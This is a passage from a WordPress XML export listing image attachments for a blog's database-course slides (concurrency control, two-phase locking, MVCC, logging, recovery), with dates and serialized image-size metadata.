s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[15 Concurrency Control Theory]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=317</link>
		<pubDate>Fri, 20 May 2022 12:26:39 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/15-Concurrency-Control-Theory.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>317</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:26:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:26:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:26:39]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:26:39]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[15-concurrency-control-theory]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/15-Concurrency-Control-Theory.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/15-Concurrency-Control-Theory.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1547;s:6:"height";i:873;s:4:"file";s:41:"2022/05/15-Concurrency-Control-Theory.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-300x169.jpg";s:5:"width";i:300;s:6:"height";i:169;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:42:"15-Concurrency-Control-Theory-1024x578.jpg";s:5:"width";i:1024;s:6:"height";i:578;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-768x433.jpg";s:5:"width";i:768;s:6:"height";i:433;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:42:"15-Concurrency-Control-Theory-1536x867.jpg";s:5:"width";i:1536;s:6:"height";i:867;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-670x378.jpg";s:5:"width";i:670;s:6:"height";i:378;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:41:"15-Concurrency-Control-Theory-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[16 Two-Phase Locking]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=324</link>
		<pubDate>Fri, 20 May 2022 12:41:26 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/16-Two-Phase-Locking.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>324</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:41:26]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:41:26]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:41:26]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:41:26]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[16-two-phase-locking]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>323</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/16-Two-Phase-Locking.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/16-Two-Phase-Locking.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1562;s:6:"height";i:876;s:4:"file";s:32:"2022/05/16-Two-Phase-Locking.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-300x168.jpg";s:5:"width";i:300;s:6:"height";i:168;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:33:"16-Two-Phase-Locking-1024x574.jpg";s:5:"width";i:1024;s:6:"height";i:574;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-768x431.jpg";s:5:"width";i:768;s:6:"height";i:431;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:33:"16-Two-Phase-Locking-1536x861.jpg";s:5:"width";i:1536;s:6:"height";i:861;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-670x376.jpg";s:5:"width";i:670;s:6:"height";i:376;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:32:"16-Two-Phase-Locking-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[17 Timestamp Ordering Concurrency Control]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=327</link>
		<pubDate>Fri, 20 May 2022 12:44:06 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/17-Timestamp-Ordering-Concurrency-Control.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>327</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:44:06]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:44:06]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:44:06]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:44:06]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[17-timestamp-ordering-concurrency-control]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>326</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/17-Timestamp-Ordering-Concurrency-Control.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/17-Timestamp-Ordering-Concurrency-Control.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1556;s:6:"height";i:873;s:4:"file";s:53:"2022/05/17-Timestamp-Ordering-Concurrency-Control.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-300x168.jpg";s:5:"width";i:300;s:6:"height";i:168;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:54:"17-Timestamp-Ordering-Concurrency-Control-1024x575.jpg";s:5:"width";i:1024;s:6:"height";i:575;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-768x431.jpg";s:5:"width";i:768;s:6:"height";i:431;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:54:"17-Timestamp-Ordering-Concurrency-Control-1536x862.jpg";s:5:"width";i:1536;s:6:"height";i:862;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-670x376.jpg";s:5:"width";i:670;s:6:"height";i:376;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:53:"17-Timestamp-Ordering-Concurrency-Control-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[18 Multi-Version Concurrency Control]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=330</link>
		<pubDate>Fri, 20 May 2022 12:46:37 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/18-Multi-Version-Concurrency-Control.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>330</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:46:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:46:37]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:46:37]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:46:37]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[18-multi-version-concurrency-control]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>329</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/18-Multi-Version-Concurrency-Control.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/18-Multi-Version-Concurrency-Control.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1556;s:6:"height";i:870;s:4:"file";s:48:"2022/05/18-Multi-Version-Concurrency-Control.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-300x168.jpg";s:5:"width";i:300;s:6:"height";i:168;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:49:"18-Multi-Version-Concurrency-Control-1024x573.jpg";s:5:"width";i:1024;s:6:"height";i:573;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-768x429.jpg";s:5:"width";i:768;s:6:"height";i:429;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:49:"18-Multi-Version-Concurrency-Control-1536x859.jpg";s:5:"width";i:1536;s:6:"height";i:859;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-670x375.jpg";s:5:"width";i:670;s:6:"height";i:375;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:48:"18-Multi-Version-Concurrency-Control-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[19 Database Logging]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=334</link>
		<pubDate>Fri, 20 May 2022 12:50:01 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/19-Database-Logging.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>334</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:50:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:50:01]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:50:01]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:50:01]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[19-database-logging]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>333</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/19-Database-Logging.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/19-Database-Logging.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1562;s:6:"height";i:874;s:4:"file";s:31:"2022/05/19-Database-Logging.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:31:"19-Database-Logging-300x168.jpg";s:5:"width";i:300;s:6:"height";i:168;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:32:"19-Database-Logging-1024x573.jpg";s:5:"width";i:1024;s:6:"height";i:573;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:31:"19-Database-Logging-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:31:"19-Database-Logging-768x430.jpg";s:5:"width";i:768;s:6:"height";i:430;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:32:"19-Database-Logging-1536x859.jpg";s:5:"width";i:1536;s:6:"height";i:859;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:31:"19-Database-Logging-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:31:"19-Database-Logging-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:31:"19-Database-Logging-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:31:"19-Database-Logging-670x375.jpg";s:5:"width";i:670;s:6:"height";i:375;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:31:"19-Database-Logging-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:31:"19-Database-Logging-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[20 Database Recovery]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=337</link>
		<pubDate>Fri, 20 May 2022 12:51:16 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/20-Database-Recovery.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>337</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:51:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:51:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:51:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:51:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[20-database-recovery]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>336</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/20-Database-Recovery.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/20-Database-Recovery.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1558;s:6:"height";i:872;s:4:"file";s:32:"2022/05/20-Database-Recovery.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:32:"20-Database-Recovery-300x168.jpg";s:5:"width";i:300;s:6:"height";i:168;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:33:"20-Database-Recovery-1024x573.jpg";s:5:"width";i:1024;s:6:"height";i:573;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:32:"20-Database-Recovery-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:32:"20-Database-Recovery-768x430.jpg";s:5:"width";i:768;s:6:"height";i:430;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:33:"20-Database-Recovery-1536x860.jpg";s:5:"width";i:1536;s:6:"height";i:860;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:32:"20-Database-Recovery-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:32:"20-Database-Recovery-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:32:"20-Database-Recovery-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:32:"20-Database-Recovery-670x375.jpg";s:5:"width";i:670;s:6:"height";i:375;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:32:"20-Database-Recovery-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:32:"20-Database-Recovery-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[src=http___img-blog.csdnimg.cn_img_convert_e7fcf8b0b298ddb26f73d69389f0b606.png&refer=http___img-blog.csdnimg]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=342</link>
		<pubDate>Sat, 28 May 2022 11:19:16 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/05/srchttp___img-blog.csdnimg.cn_img_convert_e7fcf8b0b298ddb26f73d69389f0b606.pngreferhttp___img-blog.csdnimg.webp</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>342</wp:post_id>
		<wp:post_date><![CDATA[2022-05-28 19:19:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-28 11:19:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-28 19:19:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-28 11:19:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[srchttp___img-blog-csdnimg-cn_img_convert_e7fcf8b0b298ddb26f73d69389f0b606-pngreferhttp___img-blog-csdnimg]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>341</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/05/srchttp___img-blog.csdnimg.cn_img_convert_e7fcf8b0b298ddb26f73d69389f0b606.pngreferhttp___img-blog.csdnimg.webp]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/05/srchttp___img-blog.csdnimg.cn_img_convert_e7fcf8b0b298ddb26f73d69389f0b606.pngreferhttp___img-blog.csdnimg.webp]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
